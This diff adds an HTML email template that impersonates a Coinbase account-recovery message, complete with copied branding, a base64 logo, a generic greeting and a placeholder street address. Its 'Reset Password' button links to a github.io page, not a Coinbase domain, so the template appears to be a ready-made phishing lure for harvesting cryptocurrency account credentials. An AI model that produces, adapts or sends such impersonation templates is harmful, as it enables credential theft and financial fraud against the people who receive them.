@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="ISO-8859-10">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coinbase Account Recovery</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        table {
+            border-spacing: 0;
+            width: 100%;
+        }
+
+        td {
+            padding: 0;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border: 1px solid #e1e4e8;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .content {
+            padding: 20px;
+            text-align: left;
+        }
+
+        .content h1 {
+            color: #0052ff;
+        }
+
+        .content p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .button {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .button a {
+            background-color: #0052ff;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 15px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+
+        .footer a {
+            color: #0052ff;
+            text-decoration: none;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .container {
+                width: 100% !important;
+                padding: 10px !important;
+            }
+
+            .button a {
+                padding: 10px 15px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <table width="100%" cellpadding="0" cellspacing="0">
+        <tr>
+            <td align="center" bgcolor="#f5f7fa">
+                <table class="container" width="600" cellpadding="0" cellspacing="0">
+                    <tr>
+                        <td class="header">
+                            <img src="data:image/jpeg;base64,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" />
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="content">
+                            <p>Dear Customer,</p>
+                            <p>We received a request to reset the password for your Coinbase account associated with this email address. If you made this request, please click the link below to proceed with the account recovery process.</p>
+                            <div class="button">
+                                <a href="https://vital987.github.io/">Reset Password</a>
+                            </div>
+                            <p>If you did not request a password reset, please disregard this email. No changes have been made to your account.</p>
+                            <p>For your security, if you have any concerns, you can reach out to our support team directly through our website or email support@coinbase.com.</p>
+                            <p>Thank you for choosing Coinbase.</p>
+                            <p>Sincerely, <br>The Coinbase Team</p>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="footer">
+                            <p>Coinbase, Inc. | 123 Main Street | San Francisco, CA 94101</p>
+                            <p><a href="mailto:support@coinbase.com">Contact Support</a></p>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+
+</html>
